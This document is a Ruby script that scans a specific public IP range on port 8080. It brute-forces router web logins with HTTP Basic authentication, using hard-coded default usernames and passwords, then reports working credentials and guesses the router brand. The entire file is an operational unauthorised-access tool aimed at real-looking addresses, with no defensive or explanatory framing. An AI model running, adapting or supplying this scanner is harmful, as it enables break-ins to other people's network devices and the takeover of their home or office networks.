require 'socket'
require 'net/http'
require "base64"
require 'thread'
require 'timeout'



class Rpw

	def initialize(ip,port)
		@router=nil
		@ip=ip
		@port=port
		
	end
	def test_connection()
		begin 
		 	Timeout.timeout(0.2) do       

				if socket = TCPSocket.new(@ip, @port)
					return true

				end
			end
		rescue	Timeout::Error,Errno::ECONNREFUSED

			return false

		end
	end
	def detect(body_data)
		routers = {:thomson => "Thomson", :cisco => "cisco ", :technicolor => "technicolor"}
		body_data.each {|data,value| print data," = > ",value,"\n"}

		routers.each do |data, re|
			if body_data.body.match(re)
				puts data
			end
		end

	end
	def crack()
		password = ["Swe-ty65", 'RdET23-10', 'TmcCm-651', 'Ym9zV-05n', 'Uq-4GIt3M',"superman","admin"]
		password = password.reverse()
		user = ["admin","superman"]
		threads = []
		credential = []
		
		user.each do |user_name| 
			password.each  do |passwd|
				threads << Thread.new{credential << login_request(user_name,passwd)}
				
				if(threads.size()%8 == 0 && threads.size() != 0)
					threads.each(&:join)
					threads=[]
				end
			end
		end
		threads.each(&:join)
		credential.each do |rta|
			if rta[0].code == "200" || rta[0].code == "301"
				print "ok"
				return rta
			end
			
		end
		return false
	end
	def login_request(user_name,passwd)
		print "."
		uri = URI("http://#{@ip}:#{@port}")
		req = Net::HTTP::Get.new(uri.request_uri)
		req['Authorization']="Basic #{Base64.encode64("#{user_name}:#{passwd}")}"
		res = Net::HTTP.start(uri.hostname, uri.port) {|http| http.request(req) }
		return res,[user_name , passwd]
	end
	def ip
		@ip
	end
end
 c=0
for i in (103..255)
	router = Rpw.new("190.158.217.#{i}",8080) 
	if router.test_connection
		print "#{c}) 190.158.217.#{i}: "
		if win=router.crack() 
			router.detect(win[0])
			c+=1
		end
	end

end

